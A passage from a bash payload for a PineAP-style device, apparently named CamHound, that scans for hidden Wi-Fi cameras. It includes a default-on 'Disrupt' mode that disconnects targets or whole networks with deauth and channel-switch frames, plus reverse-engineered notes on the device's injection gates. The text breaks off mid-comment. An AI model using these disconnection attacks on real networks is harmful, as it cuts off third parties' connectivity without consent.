#!/bin/bash
# shellcheck disable=SC2034   # config and scan-state declarations are copied verbatim; the hook uses a subset
# Title: CamHound (Recon hook)
# Description: Run CamHound's Watch (live view), Stimulus test, Locate or Disrupt on the AP or
#              client that is selected in the Recon menu. The same file is installed as
#              recon/client/CamHound and recon/access_point/CamHound; it branches at run time on
#              the selected-client variable. Disrupt reads the target's protection posture from its
#              beacon and then disconnects it with deauth+disassoc, channel-switch announcements,
#              or all three. RESPONSE defaults to 1, so Disrupt is present. The hook has no Settings
#              menu of its own: set the key in the CamHound user payload's Settings -> Response
#              settings, or run PAYLOAD_SET_CONFIG camhound RESPONSE 0 -- the hook reads the same
#              saved key. Every transmit sits behind a confirm by default, and only DEAUTH on a
#              client row is targeted -- CSA and BOTH hit the whole BSS.
#              GENERATED FILE: dev/CamHound/gen_hooks.sh copies the config block, the lib block and
#              the watch-core block verbatim from library/user/reconnaissance/CamHound/payload.sh.
#              Edit the user payload and regenerate; dev/CamHound/check_sync.sh verifies the copies.
# Author: tsuinami-1112
# Version: 1.0
# Category: reconnaissance
# Dependencies: _pineap, tcpdump + hexdump or od (Watch), iwinfo, /lib/hak5/oui.txt; cam_signatures.txt next
#               to this file or in the user payload directory (both are probed).
#
# LED State Descriptions
# SETUP          - loading signatures and preflight
# CYAN VERYFAST  - Watch running (Recon hopping paused by the EXAMINE lock)
# R SOLID        - Watch reached STREAM or EVENT (+ one long vibe)
# YELLOW         - Watch INCONCLUSIVE (+ one short vibe)
# B/C/Y/R SOLID  - Locate tiers cold/warm/strong/hot (click per sample, vibe at hot)
# MAGENTA        - response transmitting (channel locked for the burst)
# GREEN          - response MOVED: the target stopped transmitting (+ one long vibe)
# YELLOW         - response NO_EFFECT or INCONCLUSIVE
# FINISH, OFF    - clean exit

PAYLOAD_REL="user/reconnaissance/CamHound"
PAYLOAD_REL_ALT="recon/client/CamHound recon/access_point/CamHound"   # the v1.1 hooks live here
PAYLOAD_NAME="camhound"
VERSION="1.0"

# ----------------------------------------------------------------------------- config block ---
# Starred keys may be overridden without editing: PAYLOAD_SET_CONFIG camhound <KEY> <value>
# All weights and thresholds are lab starting points; see README "Test matrix" (Measured column).
MODE="ROOM"             # ROOM or SITE (menu toggle; changes alerting/proximity/sort, never the list)
CYCLE_SECS=20           # * scan period (floor 5)
COOLDOWN_SECS=600       # * re-alert suppression per MAC
ALERT_DIALOG=1          # * blocking ALERT on NEW CONFIRMED when AUTO_WATCH=0 (0 = off)
AUTO_WATCH=1            # * offer Watch on the top candidate / on NEW CONFIRMED-LIKELY (0 = off)
AUTO_LOCATE=1           # * offer Locate after a STREAM/EVENT Watch (0 = off)
AUTO_WATCH_RSSI=-72     # minimum last RSSI to auto-offer Watch
RSSI_MIN=0              # * optional list gate, dBm, on the best RSSI known for the MAC (0 = off, widest net)
BAND6=0                 # * also scan 6 GHz: writes the device's bands + 6 for this run; put back at exit, by the watchdog if killed, or at the next start (0 = leave as set)
SOUND=0                 # * RINGTONE alert on NEW CONFIRMED (0 = off)
SHOW_MODULES=1          # modules list in the menu
SHOW_OTHER=1            # "Other devices" list: heard, but in neither of the two lists above
MODULE_HINT_RSSI=-55    # client RSSI at or above which a BUSY module gets the "Watch?" hint
BUSY_PPS=10             # counted frames/s floor for BUSY (PineAP packet counter delta)
BUSY_CYCLES=2           # consecutive cycles at or above BUSY_PPS
KIT_MIN_CLIENTS=1       # associated same-label clients for the KIT signal
WIN_SECS=10             # Watch window (floor 5)
LIVE_WINDOWS=6          # Live view windows per Watch (A stops earlier)
WIN_BASE_S=30; WIN_STIM_S=20; WIN_POST_S=20   # stimulus windows
QUIET_SECS=15           # stimulus quiet gate: one capture of this length, repeated up to 4x until uplink is quiet
THR_STREAM_UP=10        # * big uplink frames/s for STREAM
THR_ASYM10=30           # asym (U_bytes/(D_bytes+1)) x10 at or above which a window is up-heavy (3.0)
THR_CV10=6              # coefficient of variation x10 at or below which uplink is steady (0.6)
THR_DELTA10=20          # stimulus delta x10 for EVENT (2.0)
THR_DELTA_WEAK10=15     # stimulus delta x10 for EVENT? (1.5)
THR_STIM_UP=8           # big uplink frames/s floor during stimulus/post for EVENT
THR_DELTA_FLOOR=2       # baseline floor (big fr/s) for the delta ratio
THR_DOWN10=25           # asym x10 at or below which a window is down-heavy (2.5)
BIG_BYTES=1000          # orig_len threshold for a "big" frame
INCONCLUSIVE_FRAMES=20  # display hint on the INCONCLUSIVE screen
WATCH_MIN_RSSI=-72      # below this the Watch header warns that an idle verdict is unreliable
WATCH_OTHERS=1          # third capture "others on this BSS" (Phase 0 item 13c decides CPU)
RELOCK_PER_WINDOW=0     # 1 = re-issue EXAMINE_BSSID before every window (Phase 0 item 8)
MAX_RUNS=3              # stimulus repeats per target per session
LOCATE_SILENT_AP=15; LOCATE_SILENT_CLI=45   # MONITOR file not growing -> "quiet Ns"
MEDIAN_N=5              # Locate median ring
REPORT_EVERY=15         # cycles between report rewrites
GPS=0                   # closest-approach GPS stamping (0 = off)
KEEP_PCAP=0; KEEP_RAW=0 # Watch artefacts copied to loot
DEDUPE_H=0              # * hours: a device already in inventory.tsv within this horizon is not alerted again (0 = off)
INVENTORY_KEEP_DAYS=30  # inventory.tsv rows older than this are pruned at start (0 = never)
ROW_W=22                # list row budget (spike 19; expected 36-40 on the default theme)
RECON_IF="wlan1mon"     # PineAP monitor radio (tri-band)
INJ_SYSFS="/sys/class/ieee80211"   # phy list for the regulatory probe (the laptop harness points this at a fixture)
NET_SYSFS="/sys/class/net"         # netdev tree the probe resolves RECON_IF's phy from (the laptop harness points this at a fixture)
BANDS_PROBE_N=12; BANDS_PROBE_WAIT=0.5   # band write check: samples of the live channel, and the gap between them (~6 s)
# response rung (recon+response). RESPONSE=0 keeps the payload recon-only and silent.
RESPONSE=1              # * master switch for the response rung (0 = recon only, transmits nothing)
SWEEP_TARGETED=1        # * after a BSS-wide deauth, also send ONE TARGETED deauth per recovered member
RECON_FRESH=1           # * start a fresh Recon session at launch, so a run shows what is transmitting NOW
RESPONSE_CONFIRM=1      # * blocking confirmation dialog before any transmit (0 = act on accept alone)
AUTO_RESPOND=0          # * let the funnel offer Disrupt by itself (needs RESPONSE=1; 0 = manual only)
# shellcheck disable=SC2034
SCAN_IF="wlan0"         # reserved: posture cross-check iface, the enabled dummy sta on radio0 (2.4 GHz only)
BCN_CAP_SECS=4          # seconds to wait for a beacon when reading a target's posture
BCN_CAP_COUNT=5         # beacons to capture per posture read (first usable one is parsed)
# Client-membership capture, for a BSS-wide response. No shipped firmware carries a client->AP
# association, so the subject set is read off the air instead (RESPONSE.md 13a-i). Deliberately
# NOT starred: the star contract requires a SETTINGS_TABLE row, and that menu is the recon-side
# session's lane -- an unwired star would be a lie (see CLAUDE.md).
CLI_CAP_SECS=4          # listen this long for who is talking to the target BSS
CLI_CAP_COUNT=800       # frame cap for that capture (bounds the parse; the window bounds the dwell)
CLI_CAP_SNAP=128        # MUST clear radiotap it_len + 16 to reach addr2: -s 32 cannot (18+16=34)
FIRE_ERR="/tmp/cs_fire_$$.err"   # the attack command's stderr: a refusal must not read as a measurement
POSTURE_TTL=300         # * seconds a posture badge stays cached per BSSID
RESP_LOCK_SECS=20       # * EXAMINE lock duration held across a response (must exceed fire + settle)
RESP_SETTLE_SECS=6      # * wait after transmitting before re-reading the target to judge the effect
LOOT_DIR="/root/loot/CamHound"
OUI_KEYS="/tmp/cs_oui_keys.$$"          # vendor_prefetch's key list, removed as soon as awk has read it
BANDS_STATE="$LOOT_DIR/.bands_orig"      # the bands a run changed, on disk (survives a reboot) so a killed run is undone by the watchdog or the next start
OUI_FILE="/lib/hak5/oui.txt"; OUI_FILE_ALT="/rom/lib/hak5/oui.txt"
# identity weights (constants, not table columns)
W_OUI=45; W_WEAK=20; W_MODULE=0; W_ENDPOINT=-25; W_SSID=45; W_SSID_WEAK=15
W_HIDDEN=10; W_KIT=35; W_KIT_WEAK=10; W_PROBE=5; W_RAND=-40
# behaviour weights
W_STREAM_RATE=30; W_STREAM_FAST=35; W_SUSTAIN=10; W_ASYM=15; W_EVENT=60; W_EVENT_WEAK=40; W_BUSY=10; W_DOWN=-20
# ------------------------------------------------------------------------- end config block ---

# --- camhound lib begin ---
shopt -s extglob nocasematch 2>/dev/null; shopt -u nocasematch
declare -A SIG_VENDOR_PAT SIG_VENDOR_CAT SIG_VENDOR_TYPE   # keyed by label
declare -A SIG_OUI_LABEL SIG_OUI_CAT                                        # keyed by hex prefix
declare -A SIG_SSID_PAT SIG_SSID_CAT SIG_SSID_TYPE          # keyed by label
declare -A SIG_LABEL_SEEN TAG_MEANING
declare -a VENDOR_ORDER SSID_ORDER
SIG_COUNT=0; SIG_SOURCE="built-in"; SIG_BAD=0
RUN_ID=""; RUN_T0=0; CYCLE=0; PAUSED_SECS=0; STATE=""; WATCH_LOCKED=0; OWN_MACS=" "
MAIN_PID=$$; CHILD_FILE="/tmp/cs_children"; LOCK_FILE="/tmp/cs_run.pid"
HAVE_JQ=0; HAVE_TCPDUMP=0
TAG_MEANING=([HIDDEN]="hidden SSID + camera-vendor OUI" [RAND]="randomised client MAC: vendor unknown"
  [KIT-AP]="AP + clients share one camera brand (kit/NVR)" [KIT-CL]="camera of a detected kit"
  [KIT?]="module clients cluster on an odd AP" [MODULE]="IoT radio module: brand unknown"
  [PROBE]="probes for a camera SSID" [BUSY]="high packet rate this cycle"
  [STREAM]="steady big uplink: streaming-consistent" [EVENT]="uplink jumped when you moved"
  [EVENT?]="uplink rose when you moved (weak)" [DOWN]="download-heavy: call/update, not camera-like"
  [IDLE]="asleep, disarmed or local-record" [NONE]="traffic seen, no camera pattern" [SEEN]="known from an earlier run")

# log LEVEL msg...  -> events.log (debug mirror); never prints to the screen
log() { local lvl="$1"; shift; printf '%s %s %s\n' "$EPOCHSECONDS" "$lvl" "$*" >>"$LOOT_DIR/events.log" 2>/dev/null; }

# ui_ok: DuckyScript commands present? (selftest/replay on a laptop run without them)
ui_ok() { command -v LOG >/dev/null 2>&1; }

# set_state NAME -> the only caller of LED / VIBRATE / RINGTONE
set_state() {
  # shellcheck disable=SC2034
  STATE="$1"   # last state name, for events.log
  case "$1" in
    SETUP)        LED SETUP ;;
    SCAN)         LED CYAN SLOW ;;
    LIKELY)       LED AMBER; VIBRATE 100 ;;
    LIKELY_QUIET) LED AMBER ;;
    CONFIRMED)    LED RED SLOW; VIBRATE 200 100 200; [ "$SOUND" = 1 ] && RINGTONE alert >/dev/null 2>&1 & ;;
    LANE)         LED YELLOW ;;
    WATCH)        LED CYAN VERYFAST ;;
    WATCH_HIT)    LED R SOLID; VIBRATE 300 100 300 ;;
    INCONCLUSIVE) LED YELLOW; VIBRATE 100 ;;
    LOC1)         LED B SOLID ;;
    LOC2)         LED C SOLID ;;
    LOC3)         LED Y SOLID ;;
    LOC4)         LED R SOLID; VIBRATE 50 ;;
    RESPOND)      LED MAGENTA ;;
    RESPOND_HIT)  LED GREEN; VIBRATE 300 ;;
    RESPOND_NIL)  LED YELLOW; VIBRATE 100 ;;
    FAIL)         LED FAIL; VIBRATE 500 ;;
    FINISH)       LED FINISH; LED OFF ;;
    OFF)          LED OFF ;;
  esac
} 2>/dev/null

# resp_clamp_lock: the EXAMINE lock must outlast lock_target's read-back (~2.5 s) + the fire + RESP_SETTLE_SECS,
# or the post-fire Recon read happens after hopping resumed and a stalled counter reads as MOVED.
# The +5 budgets the read-back and the fire only. When the pick is not in the bss sweep (real firmware,
# where ap_mac is '-'), the post-fire resp_snapshot also runs recon_stat: up to two more _pineap RECON
# reads, each under a 15 s timeout, before unlock_target. How long those take on the device decides
# whether 5 is enough; a bench run with 'resp' lines timestamped in events.log settles it (day-one 8b).
resp_clamp_lock() {
  local min=$(( RESP_SETTLE_SECS + 5 ))
  if (( RESP_LOCK_SECS < min )); then
    RESP_LOCK_SECS=$min; log warn "RESP_LOCK_SECS raised to $min: must exceed fire + settle"; ui_ok && LOG yellow "RESP_LOCK_SECS raised to $min"
  fi
  return 0
}
# rssi_min_clamp: RSSI_MIN is a dBm threshold (negative) or 0 for off; a positive value would hide every device that has a reading
rssi_min_clamp() {
  if (( RSSI_MIN > 0 )); then
    log warn "RSSI_MIN $RSSI_MIN is not a dBm value: gate off"; ui_ok && LOG yellow "RSSI_MIN $RSSI_MIN ignored: use 0 (off) or a negative dBm"; RSSI_MIN=0
  fi
  return 0
}
# cfg KEY DEFAULT [FLOOR] -> persisted integer override or the default
cfg() {
  local v
  v=$(PAYLOAD_GET_CONFIG "$PAYLOAD_NAME" "$1" 2>/dev/null)
  if [[ $v =~ ^-?[0-9]+$ ]] && (( v >= ${3:--999999} )); then
    CFG_OVERRIDES=$((CFG_OVERRIDES + 1)); CFG_NOTE+=" $1=$v"; printf '%s' "$v"
  else
    printf '%s' "$2"
  fi
}
CFG_OVERRIDES=0; CFG_NOTE=""
load_overrides() {
  if command -v PAYLOAD_GET_CONFIG >/dev/null 2>&1; then
    CYCLE_SECS=$(cfg CYCLE_SECS "$CYCLE_SECS" 5)
    COOLDOWN_SECS=$(cfg COOLDOWN_SECS "$COOLDOWN_SECS" 0)
    ALERT_DIALOG=$(cfg ALERT_DIALOG "$ALERT_DIALOG" 0)
    AUTO_WATCH=$(cfg AUTO_WATCH "$AUTO_WATCH" 0)
    AUTO_LOCATE=$(cfg AUTO_LOCATE "$AUTO_LOCATE" 0)
    RSSI_MIN=$(cfg RSSI_MIN "$RSSI_MIN" -100)
    SOUND=$(cfg SOUND "$SOUND" 0)
    BAND6=$(cfg BAND6 "$BAND6" 0)
    THR_STREAM_UP=$(cfg THR_STREAM_UP "$THR_STREAM_UP" 1)
    RESPONSE=$(cfg RESPONSE "$RESPONSE" 0)
    RESPONSE_CONFIRM=$(cfg RESPONSE_CONFIRM "$RESPONSE_CONFIRM" 0)
    RESP_LOCK_SECS=$(cfg RESP_LOCK_SECS "$RESP_LOCK_SECS" 5)
    RESP_SETTLE_SECS=$(cfg RESP_SETTLE_SECS "$RESP_SETTLE_SECS" 1)
    AUTO_RESPOND=$(cfg AUTO_RESPOND "$AUTO_RESPOND" 0)
    SWEEP_TARGETED=$(cfg SWEEP_TARGETED "$SWEEP_TARGETED" 0)
    RECON_FRESH=$(cfg RECON_FRESH "$RECON_FRESH" 0)
    POSTURE_TTL=$(cfg POSTURE_TTL "$POSTURE_TTL" 0)
    DEDUPE_H=$(cfg DEDUPE_H "$DEDUPE_H" 0)
  fi
  # both clamps also cover a config-block edit, so they run whether or not the device offers persistence
  resp_clamp_lock; rssi_min_clamp
}

# install dir: the UI runs a copy from /tmp, so look for the data file where it can live
find_install_dir() {
  local d r rel
  for d in "${_PAYLOAD_HOME:-${PAYLOAD_HOME:-}}" "$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)"; do
    [ -n "$d" ] && [ -f "$d/cam_signatures.txt" ] && { printf '%s' "$d"; return 0; }
  done
  for r in /root/payloads /sd/payloads /mmc/root/payloads; do
    for rel in $PAYLOAD_REL $PAYLOAD_REL_ALT; do
      [ -f "$r/$rel/cam_signatures.txt" ] && { printf '%s' "$r/$rel"; return 0; }
    done
  done
  return 1
}

# sanitise: printable only, no | or ; , bounded length. Bash expansion only (zero fork).
clean_text() { local s="$1"; s=${s//[![:print:]]/}; s=${s//[|;]/_}; printf '%s' "${s:0:${2:-32}}"; }

# add_sig TYPE CAT LABEL PATTERN LINENO -> 0 ok, 1 rejected (loud)
add_sig() {
  local type="$1" cat="$2" label="$3" pat="$4" ln="$5" hex
  case "$type" in OUI|VENDOR|VENDOR_WEAK|VENDOR_MODULE|VENDOR_ENDPOINT|SSID|SSID_WEAK) ;; *) sig_reject "$ln" "bad TYPE $type"; return 1 ;; esac
  case "$cat" in SECURITY|DOORBELL|BABY|ACTION|DASH|DRONE|BODYCAM|ALPR|NVRKIT|MIXED|IOTMOD|ENDPOINT) ;; *) sig_reject "$ln" "bad CAT $cat"; return 1 ;; esac
  [[ $label =~ ^[A-Z0-9][A-Z0-9?-]{1,9}$ ]] || { sig_reject "$ln" "bad label $label"; return 1; }
  [ -z "$pat" ] && { sig_reject "$ln" "empty pattern"; return 1; }
  if [ -n "${SIG_LABEL_SEEN[$label]}" ] && [ "${SIG_LABEL_SEEN[$label]}" != "$type" ]; then sig_reject "$ln" "label $label reused across TYPEs"; return 1; fi
  SIG_LABEL_SEEN[$label]="$type"
  case "$type" in
    OUI)
      hex=${pat^^}; hex=${hex//:/}
      [[ $hex =~ ^[0-9A-F]{6}$|^[0-9A-F]{7}$|^[0-9A-F]{9}$ ]] || { sig_reject "$ln" "bad OUI $pat"; return 1; }
      SIG_OUI_LABEL[$hex]="$label"; SIG_OUI_CAT[$hex]="$cat" ;;
    VENDOR|VENDOR_WEAK|VENDOR_MODULE|VENDOR_ENDPOINT)
      [ -z "${SIG_VENDOR_PAT[$label]}" ] && VENDOR_ORDER+=("$label")
      SIG_VENDOR_PAT[$label]="$pat"; SIG_VENDOR_CAT[$label]="$cat"; SIG_VENDOR_TYPE[$label]="$type" ;;
    SSID|SSID_WEAK)
      [ -z "${SIG_SSID_PAT[$label]}" ] && SSID_ORDER+=("$label")
      SIG_SSID_PAT[$label]="$pat"; SIG_SSID_CAT[$label]="$cat"; SIG_SSID_TYPE[$label]="$type" ;;
  esac
  SIG_COUNT=$((SIG_COUNT + 1)); return 0
}
sig_reject() { SIG_BAD=$((SIG_BAD + 1)); ui_ok && LOG yellow "sig line $1 skipped: $2"; log warn "sig line $1 skipped: $2"; }

# load_signatures [file] -> parses TYPE|CAT|LABEL|PATTERN  # note ; PATTERN is last so | is safe
load_signatures() {
  local src="$1" line type cat label pat n=0
  while IFS= read -r line || [ -n "$line" ]; do
    n=$((n + 1)); line=${line%$'\r'}
    [[ $line =~ ^[[:space:]]*(#|$) ]] && continue
    line=${line%%+([[:space:]])#*}          # strip trailing "  # note"
    IFS='|' read -r type cat label pat <<<"$line"
    [ -z "$pat" ] && { sig_reject "$n" "needs 4 fields"; continue; }
    pat=${pat%%+([[:space:]])}; type=${type%%+([[:space:]])}
    add_sig "$type" "$cat" "$label" "$pat" "$n"
  done <"$src"
}
builtin_signatures() {
  cat <<'EOF'
OUI|SECURITY|REO-OUI|EC:71:DB
OUI|SECURITY|WYZE-OUI|A4:DA:22:2
VENDOR|SECURITY|HIK-OUI|hikvision|hangzhou ezviz
VENDOR|SECURITY|DAHUA-OUI|zhejiang dahua
VENDOR|SECURITY|ARLO-OUI|arlo technolog
VENDOR|SECURITY|AXIS-OUI|axis communications ab
VENDOR|SECURITY|HANW-OUI|hanwha (techwin|vision)
VENDOR|SECURITY|WYZE-V|wyze labs
VENDOR|SECURITY|REO-V|reolink
VENDOR|DOORBELL|RING-OUI|^ring llc
VENDOR|SECURITY|BLINK-OUI|blink by amazon|immedia
VENDOR|SECURITY|NEST-OUI|nest labs|dropcam
VENDOR|SECURITY|CCTV-OUI|vivotek|verkada|avigilon|mobotix|arecont|amcrest|swann communications|lorex technology|uniview|zhejiang uniview
VENDOR|DASH|DASH-OUI|pittasoft|thinkware
VENDOR|BODYCAM|AXON-OUI|taser international|axon enterprise
VENDOR|ACTION|GOPRO-OUI|gopro|arashi vision
VENDOR_WEAK|MIXED|AMZN-MIX|amazon technologies
VENDOR_WEAK|MIXED|GOOG-MIX|^google
VENDOR_WEAK|MIXED|TPL-MIX|tp-link
VENDOR_WEAK|MIXED|TUYA-MIX|tuya smart
VENDOR_WEAK|MIXED|XIAOMI-MIX|xiaomi
VENDOR_WEAK|MIXED|ANKER-MIX|fantasia trading|smart innovation llc
VENDOR_WEAK|MIXED|NET-MIX|netgear|ubiquiti|logitech
VENDOR_WEAK|DRONE|DJI-MIX|sz dji
VENDOR_MODULE|IOTMOD|ESP-MOD|espressif
VENDOR_MODULE|IOTMOD|RTK-MOD|realtek
VENDOR_MODULE|IOTMOD|AZW-MOD|azurewave|murata|ampak|fn-link|bilian|ai-thinker|hi-?link|ai-link|mediatek|texas instruments|ingenic|quectel
VENDOR_MODULE|IOTMOD|USI-MOD|lite-?on|universal scientific
VENDOR_MODULE|IOTMOD|OEM-MOD|sercomm|wistron neweb
VENDOR_ENDPOINT|ENDPOINT|INTEL-END|intel corporate
VENDOR_ENDPOINT|ENDPOINT|OEM-END|apple, inc|samsung electronics|microsoft|dell inc|hewlett packard|^hp inc|lenovo|qualcomm
SSID|SECURITY|EZVIZ-AP|^EZVIZ_[0-9A-Z]{9}$
SSID|SECURITY|HAP-AP|^HAP_
SSID|SECURITY|TAPO-AP|^Tapo_Cam_
SSID|SECURITY|BLINK-AP|^BLINK-[0-9A-Za-z]{4}$
SSID|DOORBELL|RING-AP|^Ring-[0-9A-Fa-f]{6}$|^Ring Setup [0-9A-Fa-f]{2}$
SSID|SECURITY|IPC-AP|^IPC_AP_|^GW_AP_|^HICAM_|^CAM_[0-9A-F]{6}$|^MCCamera|^MV[0-9]{8}$|^Swann-SWIFI-|^DAP-AMC
SSID|ACTION|GOPRO-AP|^GP[0-9]{8}$|\.OSC$
SSID_WEAK|SECURITY|CAMWORD|(^|[^[:alnum:]])(cam|camera|ipc|nvr|dvr|doorbell)([^[:alnum:]]|$)
EOF
}

# vendor lookup: one grep per NEW MAC, cached; both oui.txt key spellings and column layouts
declare -A VENDOR VLOW
# OUI_AWK: resolve many OUI keys in ONE pass over the table, instead of one grep per MAC.
# Measured on the Pager 2026-11-05: a single failed `grep -i -m1` over /lib/hak5/oui.txt
# (1,258,802 B, 38,959 lines) costs 5.05 s wall / 2.08 s CPU, and a cold cycle resolved 960 MACs.
# Semantics are matched to the grep it replaces, which is prefix- and case-insensitive:
#   * the line's own key is derived by stripping : and - and upper-casing the first six characters,
#     so EC71DB, EC:71:DB, EC-71-DB and a longer first field such as EC71DB0 all reduce to EC71DB.
#     The long-prefix case is not hypothetical - this payload ships a 7-nibble OUI row (A4:DA:22:2).
#   * first match wins, mirroring grep -m1, so a duplicated OUI keeps the FIRST vendor, not the last.
#   * FS is \t+ because bash's `IFS=$'\t' read` collapses tab runs and awk -F'\t' does not; the
#     canonical IEEE 3-column layout has a double tab and would otherwise yield an empty vendor.
#   * ishexish() replaces the /^[0-9A-Fa-f:-]{6,17}$/ interval, because mawk (what the dev host runs)
#     and BusyBox awk (what the Pager runs) do not agree on interval regexes.
OUI_AWK='
function ishexish(x) { return (length(x) >= 6 && length(x) <= 17 && x ~ /^[0-9A-Fa-f:-]+$/) }
BEGIN { FS = "\t+" }
NR == FNR { want[$0] = 1; next }
{ k = $1; gsub(/[:-]/, "", k); k = toupper(substr(k, 1, 6))
  if ((k in want) && !(k in got)) {
    if (NF < 2) { v = $0 }
    else { v = $2; if (v == "(hex)" || ishexish(v)) v = (NF >= 3 ? $3 : ""); if (v == "") v = $2 }
    got[k] = 1; print k "\t" v } }'

# vendor_prefetch mac... -> resolve every not-yet-cached, non-randomised MAC in one table pass.
# Misses are cached too (VLOW set to empty): the 5.05 s datum IS the miss, so caching only the hits
# would optimise the cheap half and leave the expensive half falling through to vendor_of's grep.
vendor_prefetch() {
  local m hex v cv; local -A vp_want=() vp_found=()   # vp_ prefix: `want` and `found` are string locals
                                                     # elsewhere, and bash locals are dynamically scoped
  [ -r "$OUI_FILE" ] && (( $# > 0 )) || return 0
  for m in "$@"; do
    m=${m,,}; [ -n "${VLOW[$m]+x}" ] && continue
    is_rand "$m" && continue
    hex=${m^^}; hex=${hex//:/}; vp_want[${hex:0:6}]=1
  done
  (( ${#vp_want[@]} )) || return 0
  printf '%s\n' "${!vp_want[@]}" >"$OUI_KEYS" 2>/dev/null || return 0
  while IFS=$'\t' read -r hex v; do vp_found[$hex]="$v"; done < <(awk "$OUI_AWK" "$OUI_KEYS" "$OUI_FILE" 2>/dev/null)
  rm -f "$OUI_KEYS"
  for m in "$@"; do
    m=${m,,}; [ -n "${VLOW[$m]+x}" ] && continue
    is_rand "$m" && continue
    hex=${m^^}; hex=${hex//:/}; v="${vp_found[${hex:0:6}]}"
    VLOW[$m]="${v,,}"
    cv="${v:--}"; cv=${cv//[![:print:]]/}; cv=${cv//[|;]/_}; VENDOR[$m]="${cv:0:14}"
  done
}

vendor_of() {   # vendor_of mac -> sets VENDOR[mac] (clean, <=14) and VLOW[mac] (lowercase full)
  local mac="$1" hex key line v="" cv
  [ -n "${VLOW[$mac]+x}" ] && return 0
  # A locally administered MAC is a guaranteed full-file miss, which is the 5.05 s worst case rather
  # than the average, so skip the table for it. This MUST sit after the cache guard above: before it,
  # st_device's injected VLOW is overwritten and four scoring checks fail (tested).
  # The tempting premise "locally administered implies absent from the registry" is FALSE - the live
  # MA-L registry carries 18 such assignments (AA0000-AA0004 DEC, 02608C/02C08C 3Com, 020701/027001
  # Racal-Datacom) - but all 18 are 1980s vendors no modern device presents, and upsert_rows already
  # refuses to persist a randomised client row at all, so the lookup buys nothing either way.
  if is_rand "$mac"; then VLOW[$mac]=""; VENDOR[$mac]="-"; return 0; fi
  hex=${mac^^}; hex=${hex//:/}; key="${hex:0:6}"
  if [ -r "$OUI_FILE" ]; then
    line=$(grep -i -m1 -e "^${key}" -e "^${key:0:2}:${key:2:2}:${key:4:2}" -e "^${key:0:2}-${key:2:2}-${key:4:2}" "$OUI_FILE" 2>/dev/null)
    if [ -n "$line" ]; then
      IFS=$'\t' read -r _ v _ <<<"$line"
      [[ $v =~ ^\(hex\)$|^[0-9A-Fa-f:-]{6,17}$ ]] && { IFS=$'\t' read -r _ _ v _ <<<"$line"; }
      [ -z "$v" ] && v=${line#*$'\t'}
      v=${v%%$'\t'*}
    fi
  fi
  # clean_text inlined: $( ) forked once per new MAC, measured at 1.15 ms a time in the cold cycle.
  VLOW[$mac]="${v,,}"; cv="${v:--}"; cv=${cv//[![:print:]]/}; cv=${cv//[|;]/_}; VENDOR[$mac]="${cv:0:14}"
}

# is_rand mac -> locally administered bit set
is_rand() { [[ ${1:1:1} =~ [26aeAE] ]]; }

# band_of freq -> sets BAND_V to 2 | 5 | 6 | ?
# Sets a global rather than printing: its one caller is in the per-device path, where $( ) forked
# once per device per cycle. Measured in container against a 960-device fixture, inlining this and
# band_rank took a warm cycle from 5.22 s to 0.72 s - 86% of the steady-state cycle was these two.
band_of() {
  local f="$1"
  if (( f >= 5925 )); then BAND_V=6; elif (( f >= 4900 )); then BAND_V=5; elif (( f >= 2400 )); then BAND_V=2; else BAND_V='?'; fi
}

# --- response posture begin ---
# Which disconnect primitive can work against a target, read from its own beacon.
#   RSN element (ID 48): RSN Capabilities, 2 octets little-endian, low octet first on the wire.
#     MFPC (capable)  = bit 7 -> 0x80 of the low octet
#     MFPR (required) = bit 6 -> 0x40 of the low octet
#   Extended Capabilities (ID 127): Beacon Protection = bit 84 -> octet 10 (0-based), mask 0x10.
#     Beacon protection is NOT in the RSNXE (ID 244) -- that element has no such bit.
# Badges: D+C both work | D?+C deauth is per-client, CSA works | C CSA only
#         NONE both blocked | NOINJ radio may not transmit here | ? posture unread
declare -A POSTURE POSTURE_TS POSTURE_RSN_C POSTURE_EXT_C   # badge, read time, and the caps it was read from, per BSSID

hex_octet() {   # hex_octet <hexstring> <index0> -> decimal octet, nonzero rc if short
  local b="${1:$(( $2 * 2 )):2}"
  [ ${#b} -eq 2 ] || return 1
  [[ $b =~ ^[0-9a-fA-F]{2}$ ]] || return 1
  printf '%d' "$(( 16#$b ))"
}

# Injectability is decided by two independent gates in series; a frame needs both.
#   Gate 1 -- pineapd, in userspace.  A compiled-in channel switch, duplicated in
#     pineap_wifi_interface::inject (0x46e800-0x46e826) and
#     interface_tracker::inject_deauth (0x472c66-0x472c8a).  It never asks the kernel
#     about regulatory state (no NL80211_CMD_GET_REG anywhere in the binary), so no
#     regdb edit, country change or `iw reg set` can lift it.  pcap_inject has exactly
#     one call site, inside the gated function, so every injected frame passes it.
#   Gate 2 -- cfg80211, in the kernel.  cfg80211_reg_check_beaconing() rejects a
#     monitor-mode frame whose channel is flagged DISABLED or NO_IR.  RADAR alone does
#     not block it.  This gate DOES follow the regulatory domain, so it is read live.
# Why guessing here is unsafe: a frame rejected by gate 2 is freed with NETDEV_TX_OK,
# so nothing reports an error.  An over-permissive verdict therefore reads back as the
# target having resisted, which is worse than refusing a channel that would have worked.
# Full derivation and re-verification recipe: dev/pager-csa-primitives.md.
PINEAPD_DFS_BLOCKED=" 52 56 60 64 100 104 108 112 116 120 124 128 132 136 140 144 "
declare -A INJ_OK        # "<band>/<channel>" -> 1 permitted by gate 2, 0 refused
INJ_PROBED=0             # 0 not yet probed, 1 probe usable, -1 probe failed -> fallback
INJ_PROBE_TS=0
INJ_TXPHY=""             # phy whose table INJ_OK holds; "" = unresolved, every phy under INJ_SYSFS merged

# inj_probe must run in the PARENT shell: it populates INJ_OK, and csa_injectable is
# reached from posture_from_caps inside $( ), where writes to globals are discarded.
# shellcheck disable=SC2120   # `force` is deliberate API for a manual re-probe; the selftest is its only caller
inj_probe() {   # inj_probe [force] -> 0 when INJ_OK is usable
  local phy d line freq ch dis rows="" n=0 namef="$NET_SYSFS/$RECON_IF/phy80211/name"
  [ "$1" = force ] || { (( INJ_PROBED != 0 && EPOCHSECONDS - INJ_PROBE_TS < POSTURE_TTL )) && return $(( INJ_PROBED == 1 ? 0 : 1 )); }
  INJ_PROBE_TS=$EPOCHSECONDS; INJ_PROBED=-1; INJ_OK=(); INJ_TXPHY=""
  command -v iw >/dev/null 2>&1 || return 1
  # Gate 2 is applied by the phy a frame leaves from, so only THAT phy's table is read: the one
  # behind RECON_IF, named by $NET_SYSFS/$RECON_IF/phy80211/name (the same link the determination
  # plan's A1 step reads with readlink, plan §A1, treating its absence as the radio not having
  # probed).  RECON_IF is that phy because pineapd injects on it -- its live cmdline carries
